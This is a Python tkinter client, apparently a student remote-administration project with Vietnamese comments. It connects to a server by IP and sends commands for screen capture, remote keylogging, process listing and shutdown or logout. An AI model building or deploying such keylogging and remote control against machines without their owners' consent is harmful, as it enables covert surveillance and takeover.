from login_page_gui import LogInPageUI
from home_page_gui import HomePageUI
import capture_screen_client as csc
import list_apps_processes_client as apc
import shutdown_logout_client as sdloc
import remote_key_logger_client as rklc
from constant import *

import socket
from tkinter import *
from tkinter import messagebox
from tkinter.ttk import *

# Biến toàn cục
COLOR_WHITE = "#FFFFFF"
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
app = Tk()
app.geometry("1000x600")
app.configure(bg=COLOR_WHITE)
app.title('Client')
app.resizable(False, False)
log_in = LogInPageUI(app)


def send_command(command):
    """Gửi lệnh tới máy chủ."""
    client.sendall(bytes(command, ENCODE_FORMAT))

def back(temp):
    """Xử lý khi button back được click."""
    temp.destroy()
    home_page.tkraise()
    send_command("QUIT")

def capture_screen():
    """Xử lý khi button live screen được click."""
    send_command("CAPTURE_SCREEN")
    temp = csc.DesktopScreen(app, client)
    if not temp.status:
        back(temp)

def disconnect():
    """Xử lý khi button disconnect được click."""
    send_command("QUIT")
    home_page.destroy()
    app.destroy()

def keylogger():
    """Xử lý khi button keylogger được click."""
    send_command("KEYLOG")
    temp = rklc.KeyloggerUI(app, client)
    temp.button_back.configure(command=lambda: back(temp))

def app_process():
    """Xử lý khi button app process được click."""
    send_command("APP_PRO")
    temp = apc.AppProcessUI(app, client)
    temp.button_back.configure(command=lambda: back(temp))

def shutdown_logout():
    """Xử lý khi button shutdown/logout được click."""
    send_command("SD_LO")
    temp = sdloc.open_shutdown_logout_window(client, app)

def show_main_ui():
    """Hiển thị giao diện chính."""
    log_in.destroy()
    global home_page
    home_page = HomePageUI(app)
    home_page.live_screen_button.configure(command=capture_screen)
    home_page.disconnect_button.configure(command=disconnect)
    home_page.key_logger_button.configure(command=keylogger)
    home_page.app_process_button.configure(command=app_process)
    home_page.shutdown_button.configure(command=shutdown_logout)

def connect(frame):
    """Xử lý khi button connect được click."""
    global client
    ip = frame.ip_address_entry.get()
    try:
        client.connect((ip, SERVER_PORT))
        messagebox.showinfo(message="Kết nối thành công!")
        show_main_ui()
    except:
        messagebox.showerror(message="Không thể kết nối!")

def main():
    """Main function."""
    log_in.submit_button.configure(command= lambda:connect(log_in))
    app.mainloop()

if __name__ == '__main__':
    main()
